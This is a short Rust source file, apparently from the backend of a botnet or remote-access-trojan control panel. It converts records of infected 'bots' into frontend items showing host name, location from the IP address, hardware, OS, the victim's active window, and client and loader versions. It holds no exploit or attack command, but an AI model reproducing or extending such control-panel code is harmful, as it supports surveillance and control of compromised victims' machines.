use server_vars::types::bot::{ BotItem, FrontendClientInstance, FrontendLoaderInstance };

use super::http_server::Bot;

pub fn convert_bot_to_frontend(bot: &Bot) -> BotItem {
    let latest_client_instance = bot.client_instances
        .iter()
        .max_by_key(|client_instance| client_instance.version)
        .unwrap();

    let bot_state = &latest_client_instance.bot_state;
    let dynamic_info = &bot_state.dynamic_info;
    let ip_info = &bot_state.ip_info;
    let hardware_info = &bot_state.hw_info;

    BotItem {
        id: bot.id.clone(),
        flag: country_emoji
            ::flag(&ip_info.country_code.clone())
            .unwrap_or(country_emoji::flag(&ip_info.country.clone()).unwrap_or("🌎".to_owned())),
        name: bot_state.os_info.host_name.clone().unwrap_or("-".to_owned()),
        cpu_brand: hardware_info.cpu_brand.clone(),
        ram: format!("{:.1} GB", (hardware_info.total_ram as f64) / (1024.0 * 1024.0 * 1024.0)),
        ping: "N/A".to_string(), // You might need to calculate this
        join_date: bot.join_date.clone(),
        system_boot_time: bot_state.os_info.boot_time.clone(),
        region: ip_info.region.clone(),
        os_info: bot_state.os_info.os_version.clone().unwrap_or("-".to_owned()),
        active_window: dynamic_info.active_window.clone(),
        // mib_config: bot.mib_config.clone(),
        client_instances: bot.client_instances
            .iter()
            .map(|client_instance| FrontendClientInstance {
                join_date: client_instance.join_date.clone(),
                version: client_instance.version,
            })
            .collect(),
        loader_instances: bot.loader_instances
            .iter()
            .map(|loader_instance| FrontendLoaderInstance {
                join_date: loader_instance.join_date.clone(),
                version: loader_instance.version,
                tag: loader_instance.tag.clone(),
            })
            .collect(),
    }
}
